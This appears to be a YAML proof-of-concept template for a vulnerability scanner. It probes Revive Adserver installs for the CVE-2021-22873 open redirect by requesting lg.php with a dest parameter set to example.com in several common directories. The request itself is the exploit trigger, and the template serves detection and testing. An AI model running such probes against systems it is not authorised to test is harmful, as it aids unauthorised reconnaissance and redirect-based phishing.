name: poc-yaml-revive-adserver-cve-2021-22873-redirect
manual: true
transport: http
set:
    re: '"(?m)^(?:Location\\s*?:\\s*?)(?:https?:\\/\\/|\\/\\/|\\/\\\\\\\\|\\/\\\\)?(?:[a-zA-Z0-9\\-_\\.@]*)example\\.com\\/?"'
    reurl: '"https://example.com"'
payloads:
    payloads:
        five:
            dir: '"revive/"'
        four:
            dir: '"openx/"'
        one:
            dir: '"ads/"'
        six:
            dir: '""'
        three:
            dir: '"adserver/"'
        two:
            dir: '"adserve/"'
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /{{dir}}www/delivery/lg.php?dest={{reurl}}
            follow_redirects: false
        expression: |
            response.status >= 300 && response.status < 400 && re.bmatches(response.raw_header)
expression: r0()
detail:
    author: 小z
    links:
        - https://nvd.nist.gov/vuln/detail/CVE-2021-22873
    vulnerability:
        level: medium